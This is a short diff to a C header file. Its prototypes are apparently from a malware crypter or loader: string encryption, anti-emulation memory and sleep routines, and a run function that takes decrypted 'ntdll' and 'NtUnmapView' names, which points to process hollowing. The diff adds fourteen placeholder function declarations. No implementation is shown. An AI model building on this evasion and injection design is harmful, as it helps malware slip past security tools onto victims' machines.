@@ -22,3 +22,18 @@ void str_to_encrypt(char *str_to_crypt, uint32_t size_str, uint32_t *key, uint32
 uint8_t *antiemul_mem(uint32_t size_memory, uint8_t *data_protect, uint32_t size_data_protect);
 void anti_emul_sleep(uintptr_t base, char *crypt_str, uint32_t size_str, uint32_t sleep_wait);
 void run(uintptr_t base, LPSTR szFilePath, PVOID pFile, char *decrypt_ntdll, char *decrypt_NtUnmapView);
+
+void function1(void);
+void function2(void);
+void function3(void);
+void function4(void);
+void function5(void);
+void function6(void);
+void function7(void);
+void function8(void);
+void function9(void);
+void function10(void);
+void function11(void);
+void function12(void);
+void function13(void);
+void function14(void);
